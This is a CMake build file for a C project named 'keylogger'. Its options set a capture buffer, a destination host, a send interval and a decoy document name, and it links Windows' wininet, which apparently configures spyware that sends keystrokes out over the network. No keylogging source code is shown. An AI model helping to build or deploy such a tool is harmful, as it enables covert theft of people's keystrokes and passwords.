cmake_minimum_required(VERSION 3.5)
project(keylogger VERSION 0.1.0)

# options
set(KEYLOGGER_BUFFER_SIZE 1048576)
set(KEYLOGGER_HOSTNAME "localhost")
set(KEYLOGGER_FAKE_DOCUMENT "test.txt")
set(KEYLOGGER_SEND_TIME 300)

# source files
file(GLOB_RECURSE SRC_FILES ./src/*.c)
add_executable(keylogger ${SRC_FILES})

# macro definitions
add_compile_definitions(KEYLOGGER_BUFFER_SIZE=${KEYLOGGER_BUFFER_SIZE})
add_compile_definitions(KEYLOGGER_HOSTNAME="${KEYLOGGER_HOSTNAME}")
add_compile_definitions(KEYLOGGER_FAKE_DOCUMENT="${KEYLOGGER_FAKE_DOCUMENT}")
add_compile_definitions(KEYLOGGER_SEND_TIME=${KEYLOGGER_SEND_TIME})

# libraries
target_link_libraries(keylogger wininet)